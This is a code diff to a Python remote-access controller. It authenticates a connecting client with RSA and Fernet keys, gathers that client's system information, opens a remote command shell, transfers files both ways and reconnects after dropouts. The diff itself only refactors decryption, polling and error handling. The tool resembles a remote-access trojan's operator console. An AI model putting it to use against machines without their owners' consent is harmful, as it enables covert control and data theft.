@@ -26,11 +26,10 @@ def establish_connection(address, time_out=None):
                 send(rsa.encrypt(key, client_key), sock=conn_to_client, is_authed=authed)
 
                 lck = Fernet(key)
-
-                encr_buff = recv(sock=conn_to_client, is_authed=authed)
-                if encr_buff:
-                    device_info_buff = decrypt(encr_buff).decode()
-                    parse_sys_info(device_info_buff)
+                encr_sys_info = recv(sock=conn_to_client, is_authed=authed)
+                if encr_sys_info:
+                    sys_info = lck.decrypt(encr_sys_info)
+                    parse_sys_info(sys_info.decode())
                     authed = True
                     print(f"[+] Established Secure Connection to {client_addr[0]}:{client_addr[1]}\n\n")
                     return conn_to_client
@@ -54,8 +53,7 @@ def recv(time_out=None, sock=None, is_authed=None, buff_size=1024):
         return None
 
     data_buff = bytes()
-    data_size = int(data_size)
-    while len(data_buff) < data_size:
+    while len(data_buff) < int(data_size):
         data_buff += sock.recv(buff_size)
 
     sock.settimeout(None)
@@ -68,6 +66,7 @@ def send(data, sock=None, is_authed=None, header_size=12):
 
     if is_authed:
         data = encrypt(data)
+        
     data_size = f"{len(data):<{header_size}}"
     sock.sendall(data_size.encode()+data)
 
@@ -97,20 +96,19 @@ def poll_connection():
         global conn_to_client
         if not conn_to_client:
             return
-            
+
         poll_obj = select.poll()
-        poll_obj.register(conn_to_client)
+        poll_obj.register(conn_to_client.fileno())
         while True:
-            event = poll_obj.poll()[0]
-            if event[1] == 19: 
+            event = poll_obj.poll()[0] 
+            if event[1] == 19 or event[1] == 23: 
                 print("\nConnection lost...")
                 conn_to_client = reset_connection(time_out=15)
                 break
 
-            elif event[1] == 32:
+            elif event[1] == select.POLLNVAL:
                 #KeyboardInterrupt
                 break
-
 
 
 def is_alive():
@@ -166,7 +164,7 @@ def upload_file(file_name):
             print(f"Error, {file_name} not found. Check path and try again.")
 
 
-def download_file(file_name, buff_size=32768):
+def download_file(file_name, buff_size=524288):
     global conn_to_client, authed
     try:
         file_data = recv(buff_size=buff_size, time_out=15, sock=conn_to_client, is_authed=authed)
@@ -213,13 +211,16 @@ def open_shell():
 
                 try:
                     output = recv(time_out=30, sock=conn_to_client, is_authed=authed)
-                    if output:
-                        output = output.decode() if output != b"%%NONE%%" else ""
+                    if output and output != b'%%NONE%%':
+                        output = output.decode()
                         print(output)
 
                 except socket.timeout:
                     print("Process timed out...")
                     continue
+                
+                except ValueError:
+                    print(output)
 
 def get_input(prompt):
     global input_buff
@@ -229,14 +230,7 @@ def get_input(prompt):
 # Program entry
 def main():
     global conn_to_client, authed
-    conn_to_client = establish_connection(address, time_out=50)
-
-    poll = threading.Thread(target=poll_connection)
-    poll.start()
-
-    # keyboard = threading.Thread(target=get_input, args=("Enter Choice: ",))
-    # keyboard.start()
-
+    conn_to_client = establish_connection(address)
     while conn_to_client:
         try:
             print_menu()
@@ -261,13 +255,14 @@ def main():
                 break
         except KeyboardInterrupt:
             break
-        # except (ConnectionError, BrokenPipeError):
-        #     print("Connection lost, attempting to reconnect...")
-        #     conn_to_client = reset_connection(time_out=15)
-        #     continue
+
+        except (ConnectionError, BrokenPipeError) as e:
+            print("Connection lost, attempting to reconnect...")
+            print(e)
+            conn_to_client = reset_connection(time_out=15)
+            continue
 
     close_connection(conn_to_client)
-    poll.join()
     print('Exiting...')
 
 
